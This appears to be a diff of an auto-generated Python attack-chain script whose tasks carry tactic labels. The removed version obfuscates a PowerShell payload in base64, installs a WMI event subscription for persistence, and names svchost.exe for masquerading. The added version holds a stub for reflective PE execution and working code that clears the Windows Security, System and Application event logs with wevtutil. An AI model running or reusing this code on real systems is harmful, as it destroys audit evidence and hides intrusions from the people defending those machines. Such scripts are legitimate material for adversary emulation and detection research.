@@ -1,136 +1,119 @@
 #!/usr/bin/env python3
-import sys, json, time
+import sys, json, time, subprocess
 from typing import Dict, Any
-import base64
-import subprocess
 
+# --- T1: Reflective PE execution (stub) ---
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
-    input_data = input_data or {}
     try:
-        # Sample PowerShell script to be obfuscated
-        powershell_script = "Write-Host 'Hello, World!'"
-
-        # Obfuscate the PowerShell script by encoding it in base64
-        script_bytes = powershell_script.encode('utf-16le')
-        obfuscated_script = base64.b64encode(script_bytes).decode()
-
-        # Prepare the result
         result = {
-            "script": obfuscated_script
+            "success": "<boolean>",
+            "host_process_id": "<integer>"
+        }
+        return {
+            "success": True,
+            "data": result,
+            "metadata": {"task_id": "T1", "execution_time": time.time() - start, "is_stub": True}
+        }
+    except Exception as e:
+        return {
+            "success": False,
+            "error": f"{type(e).__name__}: {e}",
+            "metadata": {"task_id": "T1", "execution_time": time.time() - start}
         }
 
-        return {'success': True, 'data': result,
-                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
-    except Exception as e:
-        # Return partial result with fallback value for 'script'
-        return {'success': False, 'data': {'script': None}, 'error': f'{type(e).__name__}: {e}',
-                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
+
+# --- T2: Clear Event Logs ---
+def _clear_event_log(log_name: str) -> bool:
+    """Run wevtutil cl <log_name> and return True if successful."""
+    try:
+        result = subprocess.run(
+            ["wevtutil", "cl", log_name],
+            capture_output=True,
+            timeout=30,
+            shell=True   # Required on Windows for subprocess to find wevtutil normally
+        )
+        return result.returncode == 0
+    except Exception:
+        return False
+
 
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Extract the obfuscated PowerShell script from input data
-        script = input_data.get('script', '')
+        security_cleared = _clear_event_log("Security")
+        system_cleared = _clear_event_log("System")
+        application_cleared = _clear_event_log("Application")
 
-        # Define the WMI event subscription command
-        command = [
-            'powershell', '-Command',
-            f"Register-WmiEvent -Query \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 0 AND TargetInstance.Minute = 0\" "
-            f"-Action {{ {script} }} -Name 'StartupScriptEvent' -Namespace 'root\\subscription'"
-        ]
-
-        # Execute the command to create the WMI event subscription
-        subprocess.run(command, check=True, timeout=30)
-
-        # Return the subscription ID (using the name of the event as a placeholder)
-        result = {'subscription_id': 'StartupScriptEvent'}
-
-        return {'success': True, 'data': result,
-                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
+        data = {
+            "security_cleared": security_cleared,
+            "system_cleared": system_cleared,
+            "application_cleared": application_cleared
+        }
+        success = all(data.values())
+        return {
+            "success": success,
+            "data": data,
+            "metadata": {
+                "task_id": "T2",
+                "execution_time": time.time() - start
+            }
+        }
     except Exception as e:
-        # Return partial result with fallback value for subscription_id
-        return {'success': False, 'data': {'subscription_id': None},
-                'error': f'{type(e).__name__}: {e}',
-                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
-
-def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
-    start = time.time()
-    input_data = input_data or {}
-    try:
-        # Extract the subscription_id from input_data
-        subscription_id = input_data.get('subscription_id', '')
-
-        # Define a legitimate Windows service name to masquerade as
-        legitimate_service_name = "svchost.exe"
-
-        # Prepare the result with the masqueraded process name
-        result = {
-            "process_name": legitimate_service_name
+        fallback = {
+            "security_cleared": False,
+            "system_cleared": False,
+            "application_cleared": False
+        }
+        return {
+            "success": False,
+            "data": fallback,
+            "metadata": {
+                "task_id": "T2",
+                "execution_time": time.time() - start
+            }
         }
 
-        return {'success': True, 'data': result,
-                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
-    except Exception as e:
-        # Return partial result with fallback value on failure
-        return {'success': False, 'data': {'process_name': None},
-                'error': f'{type(e).__name__}: {e}',
-                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
 
+# --- Orchestrator ---
 def main() -> dict:
     """Auto-generated orchestrator — do not edit by hand."""
     outputs: dict = {}
     results: dict = {}
     failed:  list = []
     
-    # ── T1: Obfuscate PowerShell Payload [defense-evasion] ──
+    # ── T1: Reflective PE execution [execution] ──
     try:
         r = task_T1(None)
         results['T1'] = r
         if r.get('success'):
             outputs['T1'] = r.get('data', {})
-            print(f'[+] T1 (Obfuscate PowerShell Payload): OK')
+            print(f'[+] T1 (Reflective PE execution): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T1 (Obfuscate PowerShell Payload): FAILED — {err}')
+            print(f'[-] T1 (Reflective PE execution): FAILED — {err}')
             failed.append('T1')
     except Exception as e:
         print(f'[!] T1 crashed: {e}')
         failed.append('T1')
         results['T1'] = {'success': False, 'error': str(e)}
     
-    # ── T2: Create WMI Event Subscription [persistence] ──
+    # ── T2: Clear event logs [defense-evasion] ──
     try:
-        r = task_T2(outputs.get('T1', {}))
+        r = task_T2(None)
         results['T2'] = r
         if r.get('success'):
             outputs['T2'] = r.get('data', {})
-            print(f'[+] T2 (Create WMI Event Subscription): OK')
+            print(f'[+] T2 (Clear event logs): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T2 (Create WMI Event Subscription): FAILED — {err}')
+            print(f'[-] T2 (Clear event logs): FAILED — {err}')
             failed.append('T2')
     except Exception as e:
         print(f'[!] T2 crashed: {e}')
         failed.append('T2')
         results['T2'] = {'success': False, 'error': str(e)}
-    
-    # ── T3: Masquerade as Legitimate Service [defense-evasion] ──
-    try:
-        r = task_T3(outputs.get('T2', {}))
-        results['T3'] = r
-        if r.get('success'):
-            outputs['T3'] = r.get('data', {})
-            print(f'[+] T3 (Masquerade as Legitimate Service): OK')
-        else:
-            err = r.get('error', 'unknown')
-            print(f'[-] T3 (Masquerade as Legitimate Service): FAILED — {err}')
-            failed.append('T3')
-    except Exception as e:
-        print(f'[!] T3 crashed: {e}')
-        failed.append('T3')
-        results['T3'] = {'success': False, 'error': str(e)}
     
     success = len(failed) == 0
     if success:
@@ -140,7 +123,8 @@ def main() -> dict:
     return {'success': success, 'failed': failed,
             'outputs': outputs, 'results': results}
 
+
 if __name__ == '__main__':
-    import json
+    import json as _json
     result = main()
-    print('__RESULT__=' + json.dumps(result))
+    print('__RESULT__=' + _json.dumps(result))
